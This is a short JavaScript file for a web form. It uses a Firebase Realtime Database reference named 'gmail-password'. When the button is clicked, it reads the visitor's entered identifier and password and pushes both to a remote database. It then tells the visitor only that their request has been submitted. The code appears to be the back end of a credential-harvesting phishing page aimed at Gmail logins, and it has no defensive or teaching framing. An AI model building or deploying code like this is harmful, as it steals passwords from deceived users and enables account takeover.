import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"

import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"

const myUrl = {
    databaseURL: "https://playground-c3009-default-rtdb.europe-west1.firebasedatabase.app/"
}
const app = initializeApp(myUrl)
const secondApp = getDatabase(app)
const thirdApp = ref(secondApp, "gmail-password")


const btn = document.querySelector(".button")
const int = document.querySelector(".input")
const pass = document.querySelector(".password")
const para = document.querySelector(".para")
btn.addEventListener("click", function(){
     let dataValue = int.value
     let passValue = pass.value
     push(thirdApp, dataValue)
     push(thirdApp, passValue)
     console.log(`${dataValue} added to your database`)
     para.textContent = "you request has been submitted"
})
